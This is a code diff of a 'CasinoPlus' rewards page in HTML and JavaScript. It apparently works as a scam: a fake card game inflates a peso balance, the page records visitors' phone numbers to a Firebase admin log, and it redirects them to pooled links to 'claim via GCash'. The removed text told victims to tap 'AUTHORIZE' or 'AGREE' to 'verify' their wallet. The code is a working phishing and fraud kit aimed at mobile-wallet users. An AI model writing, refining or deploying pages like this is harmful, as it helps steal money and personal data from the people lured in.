@@ -2,197 +2,145 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CasinoPlus | Live Payout</title>
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CasinoPlus | Rewards Terminal</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
+    <style>
+        :root { --gold: #fbbf24; --bg: #060a13; }
+        body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        
+        .header { text-align: center; margin-bottom: 30px; }
+        .reward-display { font-size: 32px; font-weight: 900; color: var(--gold); text-shadow: 0 0 15px rgba(251, 191, 36, 0.5); margin: 10px 0; }
 
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+        /* GRID SYSTEM */
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 400px; width: 100%; }
 
-    <script>
-        // Security & Mobile Check
-        (function() {
-            const isBanned = localStorage.getItem("cp_device_locked") === "true";
-            const isVerified = localStorage.getItem("cp_verified") === "true";
-            if (isBanned || !isVerified) { window.location.replace("index.html"); return; }
-        })();
-    </script>
+        /* CARD ANIMATIONS & HOVER */
+        .card { 
+            aspect-ratio: 1/1; background: rgba(255,255,255,0.05); border: 1px solid rgba(251, 191, 36, 0.3);
+            border-radius: 15px; display: flex; align-items: center; justify-content: center;
+            cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            font-size: 24px; position: relative; overflow: hidden;
+        }
+
+        /* Highlight sa Cursor */
+        .card:hover { transform: translateY(-5px) scale(1.05); background: rgba(251, 191, 36, 0.1); border-color: var(--gold); box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
+        
+        /* After Click Animation */
+        .card.clicked { animation: reveal 0.6s forwards; pointer-events: none; }
+        @keyframes reveal {
+            0% { transform: rotateY(0deg); }
+            50% { transform: rotateY(90deg); background: var(--gold); }
+            100% { transform: rotateY(0deg); background: rgba(34, 197, 94, 0.2); border-color: #22c55e; }
+        }
+
+        .claim-section { margin-top: 30px; width: 100%; max-width: 400px; display: none; text-align: center; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .btn-claim { background: var(--gold); color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
+    </style>
 </head>
 <body>
 
-    <div id="processingOverlay">
-        <div class="spinner"></div>
-        <div class="proc-title">ESTABLISHING SECURE VIALINK...</div>
-        <div class="proc-text">⚠️ <b>REQUIRED ACTION:</b><br>Tap <b>"AUTHORIZE"</b> or <b>"AGREE"</b> on the next screen to verify your GCash wallet and receive the reward.</div>
+    <div class="header">
+        <p style="color: #94a3b8;">Current Payout Wallet</p>
+        <div class="reward-display">₱<span id="currentBalance">0.00</span></div>
+        <p id="statusMsg" style="font-size: 12px; color: #22c55e;">Select a card to boost your reward!</p>
     </div>
 
-    <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
-        
-        <div class="live-stats">
-            <div class="online-count"><span class="dot"></span> <span id="userCount">32</span> Members Online</div>
-            <div class="live-winner-box" id="winnerBox">
-                <span id="winnerEntry">User 0917***8821 claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱500</span>
-            </div>
+    <div class="grid" id="cardGrid">
         </div>
 
-        <div class="game-grid">
-            <div class="card-wrapper" id="goddess-card" onclick="triggerMove(this)">
-                <img src="images/img1.png" class="card-img idle">
-            </div>
-            <div class="card-wrapper" id="monkey-card" onclick="triggerMove(this)">
-                <img src="images/img2.png" class="card-img idle">
-            </div>
-            <div class="card-wrapper" id="zeus-card" onclick="triggerMove(this)">
-                <img src="images/img3.png" class="card-img idle">
-            </div>
-            <div class="card-wrapper" id="bear-card" onclick="triggerMove(this)">
-                <img src="images/img4.png" class="card-img idle">
-            </div>
-            <div class="card-wrapper" id="dress-card" onclick="triggerMove(this)">
-                <img src="images/img5.png" class="card-img idle">
-            </div>
-            <div class="card-wrapper" id="boxer-card" onclick="triggerMove(this)">
-                <img src="images/img6.png" class="card-img idle">
-            </div>
-        </div>
-
-        <div class="card">
-            <img src="images/logo1.png" class="logo-img">
-            <div style="font-size: 11px; color: #fbbf24; letter-spacing: 2px; font-weight: 800;">TOTAL REWARD</div>
-            <div class="amount" id="balanceText">₱0.00</div>
-            <div class="timer-box" id="timerLabel">Unlocking reward in: <span id="countdown">05</span>s</div>
-            
-            <div class="btn-group">
-                <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Withdraw via GCash</button>
-            </div>
-            
-            <img src="images/casinoplus.jpeg" class="promo-photo">
-        </div>
+    <div class="claim-section" id="claimSection">
+        <p style="margin-bottom: 15px; font-size: 14px;">Target Amount Reached! Secure your payout now.</p>
+        <button class="btn-main btn-claim" onclick="redirectToVialink()">Claim Reward via GCash</button>
     </div>
 
-    <script>
-        // --- 1. INITIALIZE ---
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const savedPhone = localStorage.getItem("userPhone") || "Guest_" + Math.floor(Math.random() * 1000);
+<script>
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const userPhone = localStorage.getItem("userPhone") || "Guest";
+
+    let balance = 0;
+    let clickCount = 0;
+    const maxClicks = 5;
+
+    // 1. RANDOM STARTING OFFER (Matapos i-visit ang main.html)
+    window.onload = () => {
+        const randomStart = [150, 200, 250, 350][Math.floor(Math.random() * 4)];
+        updateBalance(randomStart);
+        generateCards();
+    };
+
+    function generateCards() {
+        const grid = document.getElementById('cardGrid');
+        for (let i = 0; i < 9; i++) {
+            const card = document.createElement('div');
+            card.className = 'card';
+            card.innerHTML = '🎁';
+            card.onclick = () => handleCardClick(card);
+            grid.appendChild(card);
+        }
+    }
+
+    function handleCardClick(cardElement) {
+        if (clickCount >= maxClicks || cardElement.classList.contains('clicked')) return;
+
+        clickCount++;
+        cardElement.classList.add('clicked');
         
-        // Permanent Reward Logic
-        const possibleAmounts = [350, 500, 750, 1000, 1200];
-        let assignedTotal = localStorage.getItem("assigned_total");
-        if (!assignedTotal) {
-            assignedTotal = possibleAmounts[Math.floor(Math.random() * possibleAmounts.length)];
-            localStorage.setItem("assigned_total", assignedTotal);
+        // 2. ACCURATE +25 LOGIC
+        const bonus = 25;
+        updateBalance(bonus);
+        cardElement.innerHTML = `<span style="color:#22c55e; font-weight:bold;">+${bonus}</span>`;
+
+        if (clickCount === maxClicks) {
+            document.getElementById('statusMsg').innerText = "LIMIT REACHED - PROCEED TO CLAIM";
+            document.getElementById('claimSection').style.display = 'block';
+            logUserActivity(); // Log sa Ghost Section
         }
-        assignedTotal = parseInt(assignedTotal);
+    }
 
-        let clickedCards = JSON.parse(localStorage.getItem("clicked_cards") || "[]");
+    function updateBalance(amount) {
+        balance += amount;
+        document.getElementById('currentBalance').innerText = balance.toLocaleString('en-US', {minimumFractionDigits: 2});
+    }
 
-        window.onload = function() {
-            // Restore state
-            clickedCards.forEach(id => {
-                const el = document.getElementById(id);
-                if(el) el.classList.add('card-disabled');
-            });
-            if (clickedCards.length >= 6) {
-                document.getElementById('balanceText').innerText = "₱" + assignedTotal.toLocaleString() + ".00";
-            } else if (clickedCards.length > 0) {
-                let partial = Math.floor((assignedTotal / 6) * clickedCards.length);
-                document.getElementById('balanceText').innerText = "₱" + partial.toLocaleString() + ".00";
+    // 3. LOGGING FOR ADMIN GHOST SECTION
+    function logUserActivity() {
+        db.ref('user_logs/' + userPhone).set({
+            phone: userPhone,
+            reward: balance,
+            status: 'idle', // Idle muna kasi di pa na-click yung claim button
+            last_updated: new Date().toLocaleString()
+        });
+    }
+
+    function redirectToVialink() {
+        // Find available link and redirect
+        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
+            if (snapshot.exists()) {
+                const linkId = Object.keys(snapshot.val())[0];
+                const linkData = snapshot.val()[linkId];
+
+                // Update link status to 'pending' para sa 10-min timer
+                db.ref('links/' + linkId).update({
+                    status: 'pending',
+                    user: userPhone,
+                    timestamp: Date.now()
+                });
+
+                // Update user to 'claimed' status
+                db.ref('user_logs/' + userPhone).update({ status: 'claimed' });
+
+                window.location.href = linkData.url;
+            } else {
+                alert("All payout lines are busy. Please try again in 10 minutes.");
             }
-        };
-
-        // --- 2. UNIQUE CHARACTER MOVES ---
-        function triggerMove(element) {
-            const id = element.id;
-            if (clickedCards.includes(id)) return;
-
-            let animClass = "";
-            switch(id) {
-                case "goddess-card": animClass = "move-goddess"; break;
-                case "monkey-card": animClass = "move-monkey"; break;
-                case "zeus-card": animClass = "move-zeus"; break;
-                case "bear-card": animClass = "move-bear"; break;
-                case "dress-card": animClass = "move-dress"; break;
-                case "boxer-card": animClass = "move-boxer"; break;
-            }
-
-            element.classList.add(animClass);
-            element.classList.add('card-disabled');
-            clickedCards.push(id);
-            localStorage.setItem("clicked_cards", JSON.stringify(clickedCards));
-
-            // Update Balance Animation
-            let currentBalance = Math.floor((assignedTotal / 6) * (clickedCards.length - 1));
-            let targetBalance = Math.floor((assignedTotal / 6) * clickedCards.length);
-            
-            if(clickedCards.length === 6) targetBalance = assignedTotal;
-            animateValue(currentBalance, targetBalance, 500);
-        }
-
-        function animateValue(start, end, duration) {
-            let startTimestamp = null;
-            const step = (timestamp) => {
-                if (!startTimestamp) startTimestamp = timestamp;
-                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-                const currentVal = Math.floor(progress * (end - start) + start);
-                document.getElementById('balanceText').innerText = "₱" + currentVal.toLocaleString() + ".00";
-                if (progress < 1) window.requestAnimationFrame(step);
-            };
-            window.requestAnimationFrame(step);
-        }
-
-        // --- 3. FIREBASE ADOPTION (IDLE/CLAIMED) ---
-        function updateFirebaseStatus(status) {
-            db.ref('user_logs/' + savedPhone).update({
-                phone: savedPhone,
-                reward: assignedTotal,
-                status: status, // "idle_attempt" or "claimed"
-                last_updated: new Date().toLocaleString()
-            });
-        }
-
-        function redirectToGCash() {
-            const claimBtn = document.getElementById('claimBtn');
-            const overlay = document.getElementById('processingOverlay');
-            
-            claimBtn.disabled = true;
-            overlay.style.display = 'flex';
-            
-            // Mark as IDLE muna sa database
-            updateFirebaseStatus("idle_attempt");
-
-            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
-                if (snapshot.exists()) {
-                    const linkId = Object.keys(snapshot.val())[0];
-                    const targetUrl = snapshot.val()[linkId].url;
-
-                    // Mark as CLAIMED dahil nakuha na ang link
-                    updateFirebaseStatus("claimed");
-                    
-                    db.ref('links/' + linkId).update({ status: 'pending', user: savedPhone });
-                    setTimeout(() => { window.location.href = targetUrl; }, 3500);
-                } else {
-                    alert("System busy! Please try again in 5 minutes.");
-                    overlay.style.display = 'none';
-                    claimBtn.disabled = false;
-                }
-            });
-        }
-
-        // Timer
-        let timeLeft = 5;
-        const countdownTimer = setInterval(() => {
-            timeLeft--;
-            if(document.getElementById('countdown')) document.getElementById('countdown').innerText = "0" + timeLeft;
-            if (timeLeft <= 0) {
-                clearInterval(countdownTimer);
-                document.getElementById('timerLabel').innerHTML = "Reward Slots Ready!";
-                document.getElementById('claimBtn').disabled = false;
-            }
-        }, 1000);
-    </script>
+        });
+    }
+</script>
 </body>
 </html>
